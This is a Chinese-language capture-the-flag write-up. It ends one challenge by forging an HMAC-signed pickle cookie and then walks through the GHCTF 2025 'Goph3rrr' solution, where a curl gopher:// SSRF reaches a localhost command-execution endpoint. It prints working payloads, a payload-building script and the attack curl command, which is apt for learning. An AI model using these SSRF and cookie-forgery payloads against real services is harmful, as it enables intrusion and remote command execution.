    pickle 可执行 __reduce__ 能在反序列化时执行任意代码（sleep 5 验证过）
    最终解法 源码泄露 key → 自己算 HMAC → 改钱不触发重置
    完整脚本 
    import base64
import pickle
import hmac
import hashlib

key = b"58c93becce9a13c96778ded0edd8096d"

h = hmac.new(key, digestmod=hashlib.md5)
cookies = {"money": 999999, "history": []}
h.update(str(cookies).encode())
cookies["anti_tamper_hmac"] = h.digest().hex()

print(base64.b64encode(pickle.dumps(cookies, protocol=4)).decode())
    这题踩的坑

    ① 只改 money 不改签名

    服务端会重算 HMAC，对不上就丢弃整个 session，用默认值（money=500）重建。表现出来就是“我的修改没生效”。

    ② 把 anti_tamper_hmac 一起算进签名

    源码里是先算 HMAC、后插入这个键。你把带签名的字典再算一遍，结果一定对不上。

    ③ 字典顺序变了

    str({'history': [], 'money': 999999}) 和 str({'money': 999999, 'history': []}) 是两个不同的字符串。键的插入顺序必须和服务器一致。

    ④ 以为 pickle RCE 这条路能直接拿 flag

    代码执行确实成立（sleep 5 有效），但 flag 不在磁盘上随便一个位置——它要靠“买”这个业务动作才会显示。所以还是得回到签名伪造。

    [GHCTF 2025] Goph3rrr — 用 gopher 让服务器给自己发一条 POST

    题目类型：Python 代码审计 — curl SSRF + gopher 协议构造任意 TCP 报文

    Flag：NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}

    题目概述

    进靶场没有任何有用信息，页面源码也是空的。那就扫目录。

    扫出来 app.py，拿源码审计。

    解题过程

    Step 1：先排除干扰路由

    源码里一堆路由，其中这三个是摆设：

    /Login
/Register
/Upload

    旁边还标着 junkcode——作者明说了是混淆视听用的，直接跳过，一个都别管。

    真正有用的只有两个：/Gopher 和 /Manage。

    Step 2：/Manage 是 RCE 点

    @app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()

    三句话读完：

    来源必须是 127.0.0.1      → 外部直连一定被拒
方法必须是 POST           → 路由上就写死了 methods=['POST']
cmd 从 form 里取          → 直接进 os.popen

    注意中间那个 if request.method == "GET" 分支是无用代码——路由只注册了 POST，GET 根本进不来（会 405）。不用管它。

    所以目标是：让服务器自己向 /Manage 发一条 POST，带上 cmd。

    Step 3：/Gopher 给了我们“发请求”的能力

    @app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (≧∇≦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout

    做的事：

    ① 取 url 参数
② 解析出 hostname，解析成 IP，判断是否在黑名单
③ 拦截 file:// 协议
④ 没过就交给 curl -L <url> 去请求，把输出返回

    这里的关键是 curl。curl 支持的不只是 http——它还支持 gopher://。

    gopher://host:port/_<data> 的含义是：连到这个 host 的 port，把 _ 后面的内容原样作为字节发过去，然后把响应读回来。

    这就是“手写任意 TCP 报文”的口子。

    Step 4：为什么要用 0.0.0.0 而不是 127.0.0.1

    realIpAddress in BlackList 拦的是解析出来的 IP。127.0.0.1 这种回环地址几乎一定在黑名单里。

    而 0.0.0.0 在 Linux 上是“本机所有地址”，连它等于连本机，但它不在黑名单里。

    所以 host 用 0.0.0.0：

    gopher://0.0.0.0:8000/_...

    连上去之后，REMOTE_ADDR 就是 127.0.0.1，/Manage 的来源校验就过了。

    Step 5：报文怎么写

    要发给 /Manage 一条 POST，报文必须是完整 HTTP：

    POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

cmd=ls /

    几个必须对的地方：

    ① 行尾必须 \r\n（CRLF），不是 \n
② 头部和 body 之间必须有一个空行（\r\n\r\n）
③ Content-Length 必须等于 body 的字节数
   "cmd=ls /" 正好 8 个字节
④ 先 GET 的话进不去——路由只收 POST

    gopher 里要再做一次 URL 编码，\r\n 变成 %0D%0A：

    gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/

    Step 6：用脚本拼，别手写

    这条串里 %0D%0A 出现六次，手写必错。用脚本生成：

    import urllib.parse

body = "cmd=ls /"
req = (
    "POST /Manage HTTP/1.1\r\n"
    "Host: 127.0.0.1:8000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: %d\r\n"
    "\r\n"
    "%s"
) % (len(body), body)

print("gopher://0.0.0.0:8000/_" + urllib.parse.quote(req))

    quote() 会把 \r\n 编码成 %0D%0A、空格编码成 %20，你只管把报文写对。

    Step 7：打出去

    curl 这边用 -G --data-urlencode，让命令帮忙做一次编码：

    curl.exe -s -G --data-urlencode "gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/" "http://node6.anna.nssnode.cn:24267/Gopher"

    三个参数各管一件事：

    -s                静默模式：不打印进度条和错误信息
-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=<编码后的值>）

    等价于：

    GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...

    Step 8：先 ls，再去环境变量里找

    第一次 cmd=ls /，根目录里没有 flag。

    那就看环境变量——把 body 换成 cmd=env：

    body = "cmd=env"

    flag 直接躺在环境变量里：

    NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
    关键点 说明
    /Manage 来源必须是 127.0.0.1、方法必须是 POST、cmd 直接进 os.popen
    /Gopher 服务器用 curl 请求你给的 url → curl 支持 gopher → 可发任意 TCP 报文
    黑名单 按 gethostbyname(hostname) 判，127.0.0.1 大概率在里面
    0.0.0.0 连它等于连本机，但不在黑名单里 → 绕过同时拿到 127.0.0.1 来源
    gopher 语法 gopher://host:port/_<data>，_ 之后就是原样发送的字节
    报文三要素 CRLF 行尾、头部后空行、Content-Length 与 body 字节数一致
    junkcode 作者自己标注的干扰路由，看到就跳过
    完整请求 
    GET /Gopher?url=<urlencode(gopher://0.0.0.0:8000/_<urlencode(HTTP报文)>)>

内层报文：
POST /Manage HTTP/1.1\r\n
Host: 127.0.0.1:8000\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 8\r\n
\r\n
cmd=env
    这题踩的坑

    ① 用 127.0.0.1 打 gopher

    会被黑名单直接挡住。回环地址永远是第一个被写进黑名单的。

    ② Content-Length 写错

    它必须等于 body 的字节数（cmd=ls / 是 8）。写错的话服务端会按错误的长度截断 body，cmd 参数就取不到了。

    ③ 漏掉头部后的空行

    \r\n\r\n 少一个，服务端会认为请求头还没结束，一直等——表现为超时或 400。

    ④ 手写 %0D%0A

    一条报文里六处，手写基本必错。用 urllib.parse.quote() 生成。

    ⑤ 只 ls 根目录

    根目录没有不代表没有。env、/proc/self/environ、应用目录都值得看一眼。
